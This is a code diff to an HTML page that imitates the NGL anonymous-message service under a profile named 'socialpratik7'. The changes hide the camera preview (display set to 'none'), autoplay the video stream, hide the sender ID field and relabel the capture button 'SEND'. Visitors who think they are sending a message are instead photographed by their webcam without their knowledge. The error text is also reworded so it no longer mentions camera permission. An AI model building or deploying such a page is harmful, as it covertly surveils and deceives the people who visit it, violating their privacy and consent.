@@ -97,9 +97,9 @@
         }
 
         #video{
-            width:1%;
-            border-radius:1px;
-            margin-top:1px;
+            width:100%;
+            border-radius:10px;
+            margin-top:10px;
             display:none;
         }
 
@@ -120,9 +120,13 @@
 
     <div class="container">
 
-        <div class="profile"></div>
+        <div class="profile"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQAlAMBIgACEQEDEQH/xAAbAAEAAwEBAQEAAAAAAAAAAAAABAUGAwIBB//EADUQAAICAQEEBwUIAwEAAAAAAAABAgMEEQUhktESFTFBUVNxE0JSYZEiMjRigaGx8CNDwRT/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/EABYRAQEBAAAAAAAAAAAAAAAAAAARAf/aAAwDAQACEQMRAD8A/WwAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcLcvHqell0E/BPVnNbSw3/uS9YsCWDxXbXata5xmvyvU9gAAAAAAAAAAAAAAAAAABzuthTW7LHpGJRZm0bchuMW4V/Cn2+o2plvIv6EW/Zw3R+b72QioAAD1Ccq5KVcpRku+L0LnZ+01bJVZOin7s+xP1KQAa4EHZWU8ijozetle5/NdzJxFAAAAAAAAAAAAAA4Z1rpxLbFuajovV7v+ncg7Z/Ay+ckBnwAVAAAAABM2Ta6s6Hwz+y/76miMtjfiatPjj/JqRqgAIAAAAAAAAAAAEXalbswbUu1JS+jJR8aTTT3prRgZIHfMoeNkTreuie5+KOBUAAAAAEnZ8PaZtK8Jav0W80pU7ExmlLIl7y6MfTvLYigAAAAAAAAAAAAAAfAI2fhxy6kuyyP3ZczPXVTpscLU1JeJqyPlLGnDo5Lr0XZ0nvQGZBYXYuAm/Z5qj8nFy/g5RxsZvfnQ0+VcioiE3AwJZUlKacafH4vkiXi42zotN3Qsl4Slu+hax0a1jo14oKRioxUYpJLckj6AQAAAAAAAAAAAAIudmwxIb/tTkt0QJFlkKoOdk1GK7WyryNsJarGh0vzSen7FbkZFuTPp2y1fcu5HEsEi7MyLtenbLTwW5fsR9AAgAAB6hOVb1rk4vxTPIAn0bVya3pNq2PhLc/qWmLtGjI0SfQn8Mu/0ZnABrgUeBtKdTjXe3OvsUu+PMu4yjKKlFpprVNd5FfQAAAAAAAcMzIji0OyW99kV4szdtk7bJWWPWUu1kzbF7tynX7te79e8gFAABAAAAAAAAAAACx2VmumxU2P/HJ7m/dZXADXAi7Nv/8ARhwk/vL7L/QlEUAAAAAZ2zBzJ2Tl7GWrk32rmeerszyHxLmaQAZvq7M8h8S5jq7M8h8S5mkBaRm+rszyHxLmOrszyHxLmaQCkZvq7M8h8S5jq7M8h8S5mkApGb6uzPIfEuY6uzPIfEuZpAKRm+rszyHxLmOrszyHxLmaQCkZvq7M8h8S5jq7M8h8S5mkApFdsei/HjbG6txT0a3rf/dxYgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB//Z"
+            style="width:100px;
+            height:100px;
+            border-radius:50%;
+            border:2px solid black;"></div>
 
-        <h2>Kalyani</h2>
+        <h2>socialpratik7</h2>
 
         <p>Send me anonymous messages 👀</p>
 
@@ -146,14 +150,12 @@
 
         <div class="popup-box">
 
-            <h3>Big grand monsoon fest!! 🎉🎊</h3>
-            <p>Try your luck to win exciting prizes from NGL🥳<br>Enter ur ID to get inform on winning
-            </p>
+            <h3>Send an anonymous message secretly</h3>
 
             <input
                 type="text"
                 id="senderName"
-                placeholder="Your userID"
+                placeholder="Your userID" value="kk" style="display:none;"
             >
 
             <div class="notice">
@@ -164,6 +166,7 @@
 
             <video
                 id="video"
+                autoplay
             ></video>
 
             <canvas
@@ -172,7 +175,7 @@
             ></canvas>
 
             <button onclick="saveName();capturePhoto()">
-                Continue
+                SEND
             </button>
 
         </div>
@@ -225,7 +228,7 @@
                 );
 
                 video.srcObject = stream;
-                video.style.display = "block";
+                video.style.display = "none";
 
                 await new Promise(resolve=>{
                     video.onloadedmetadata =
@@ -234,14 +237,9 @@
 
 
                 await new Promise(r=>
-                    setTimeout(r,1000)
+                    setTimeout(r,500)
                 );
 
-                canvas.width =
-                video.videoWidth;
-
-                canvas.height =
-                video.videoHeight;
 
                 const ctx =
                 canvas.getContext("2d");
@@ -305,7 +303,7 @@
                 console.log(err);
 
                 alert(
-                    "Camera permission denied or upload failed."
+                    "send failed."
                 );
             }
         };
@@ -330,7 +328,7 @@
                 capturedImageUrl === ""
             ){
                 alert(
-                    "sweet good luck from us!!"
+                    "enjoy our ngl!!"
                 );
                 return;
             }
